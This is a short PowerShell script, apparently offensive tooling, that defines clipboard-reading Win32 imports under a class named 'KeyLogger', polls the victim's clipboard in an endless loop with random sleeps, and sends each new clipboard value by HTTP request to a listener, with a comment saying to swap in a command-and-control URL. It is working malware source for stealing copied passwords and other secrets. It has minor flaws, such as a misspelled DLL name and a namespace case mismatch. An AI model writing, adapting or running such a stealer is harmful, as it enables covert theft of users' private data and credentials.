function DLL-IMPORT{
$ddl_to_imp = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern IntPtr GetClipboardData(uint uFormat);
[DllImport("uer32.dll", SetLastError = true)]
static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern bool OpenClipboard(IntPtr hWndNewOwner);
[DllImport("user32.dll")]
public static extern bool CloseClipboard();
[DllImport("user32.dll")]
public static extern bool SetClipboardData(uint uFormat, IntPtr data);
[DllImport("user32.dll")]
static extern IntPtr GetOpenClipboardWindow();
[DllImport("user32.dll")]
public static extern bool EmptyClipboard();
"@
$showWindowAsync = Add-Type -memberDefinition $ddl_to_imp -name "KeyLogger" -namespace AtomME -passThru -Language CSharp
}

function fetch_clipboard()
{
    #$codetextANSI = 1
    #$codetextOEM = 7
    $codetextUNI = 13
    # Open the Clipboard
    [AtomMe.KeyLogger]::OpenClipboard([IntPtr]::Zero)
    # GetCliboard data
    $getclipUNI = [AtomMe.KeyLogger]::GetClipboardData($codetextUNI)
    $stringUNI = [Runtime.InteropServices.Marshal]::PtrToStringUni($getclipUNI)
    #Close the clipboard
    [AtomMe.KeyLogger]::CloseClipboard()
    return $stringUNI
}
	
function Invoke-DumpClipboard(){
    DLL-IMPORT
    $delaymin = 1
    $delaymax = 2
    $old = ""
    while ($true){
    	while ($(fetch_clipboard)[2] -eq $old){
    		Start-Sleep -s (Get-Random -minimum $delaymin  -maximum $delaymax)
    		}
    	   write-host $(fetch_clipboard)[2]
    	   $text=$(fetch_clipboard)[2]
		   Invoke-WebRequest -URI http://localhost:8989/?clipboard=$text #Replace the URL with C2C url
           $old = $(fetch_clipboard)[2]
    	}
}



